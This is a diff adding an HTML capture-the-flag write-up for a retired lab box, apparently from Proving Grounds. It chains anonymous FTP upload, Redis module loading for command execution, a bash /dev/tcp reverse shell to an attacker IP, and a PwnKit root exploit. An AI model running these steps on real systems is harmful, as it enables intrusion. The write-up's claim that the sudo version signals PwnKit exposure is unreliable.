@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sybarys &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Sybarys</h1>
+    <div class="meta">Target: <code>192.168.180.93</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Redis</span><span class="tag">FTP</span><span class="tag">RedisModules</span><span class="tag">RCE</span><span class="tag">PwnKit</span><span class="tag">CVE-2021-4034</span><span class="tag">AnonymousFTP</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#redis-module-for-rce">Redis Module for RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#pwnkit-cve-2021-4034">PwnKit (CVE-2021-4034)</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Sybarys is a Linux box that demonstrates an underappreciated attack path: using anonymous FTP write access to plant a Redis module on disk, then loading that module into an unauthenticated Redis instance to gain RCE. The foothold arrives as <code>pablo</code> via a reverse shell triggered directly through Redis. Privilege escalation is PwnKit (CVE-2021-4034), same vulnerability as Snookums, applied to a different distro.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.2  (anonymous login; pub/ is world-writable)
+22/tcp   open  ssh     OpenSSH 7.4
+80/tcp   open  http    Apache httpd 2.4.6 (CentOS) PHP/7.3.22  (HTMLy blog)
+6379/tcp open  redis   Redis 5.0.9   (no authentication)
+</code></pre>
+<p>Two facts immediately stand out: FTP anonymous login is allowed and the <code>pub/</code> directory is writable (<code>drwxrwxrwx</code>), and Redis is exposed on its default port with no password.</p>
+<blockquote>
+<p><strong>Why unauthenticated Redis is dangerous:</strong> Redis is designed as an in-process cache and assumes it runs on a trusted interface. When exposed externally with no <code>requirepass</code> set, an attacker has full control, they can read and write all keys, but more critically, Redis 4.0+ supports dynamically loading native <code>.so</code> modules. A module can expose arbitrary OS-level commands.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="redis-module-for-rce">Redis Module for RCE</h3>
+<p>I downloaded the <code>RedisModules-ExecuteCommand</code> module from <code>https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</code> and uploaded the compiled <code>module.so</code> to the writable FTP directory:</p>
+<pre><code class="language-sh"># FTP session
+ftp anonymous@192.168.180.93
+ftp&gt; put module.so pub/module.so
+</code></pre>
+<p>Then connected to Redis and loaded the module directly from that path:</p>
+<pre><code class="language-sh">redis-cli -h 192.168.180.93
+192.168.180.93:6379&gt; MODULE LOAD /var/ftp/pub/module.so
+OK
+192.168.180.93:6379&gt; system.exec &quot;id&quot;
+&quot;uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n&quot;
+</code></pre>
+<p>With RCE confirmed as <code>pablo</code>, I triggered a reverse shell:</p>
+<pre><code class="language-sh">192.168.180.93:6379&gt; system.exec &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.244/6379 0&gt;&amp;1&quot;
+</code></pre>
+<p>Shell caught on port 6379:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 6379
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.93] 46778
+[pablo@sybaris /]$ whoami
+pablo
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="pwnkit-cve-2021-4034">PwnKit (CVE-2021-4034)</h3>
+<p>LinPEAS reported the sudo version:</p>
+<pre><code>Sudo version 1.8.23
+</code></pre>
+<p>Same vulnerable version as on Snookums. The Python PoC from <code>https://github.com/joeammond/CVE-2021-4034</code> escalated directly:</p>
+<pre><code class="language-sh">[pablo@sybaris tmp]$ python pwn.py
+[+] Creating shared library for exploit code.
+[+] Calling execve()
+[root@sybaris tmp]# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>CVE-2021-4034 in brief:</strong> PwnKit exploits a memory-corruption bug in <code>pkexec</code> (polkit's command-line tool) that allows any local user to execute code as root. The vulnerability existed in every polkit version since 2009 and was patched in January 2022. Sudo version 1.8.23 predates the patch, which is why it flags the issue, polkit and sudo share the same host and the version tells you the system is old enough to be affected.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">[root@sybaris root]# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>World-writable FTP directories adjacent to other listening services are an attack chain waiting to happen.</strong> The FTP <code>pub/</code> folder fed the Redis module path directly.</li>
+<li><strong>Redis with no <code>requirepass</code> and no bind restriction is root-equivalent on the host.</strong> Module loading converts it from a data store to an OS command runner.</li>
+<li><strong>Check the sudo version with LinPEAS on every box.</strong> Versions below 1.8.28 on unpatched systems are candidates for PwnKit.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
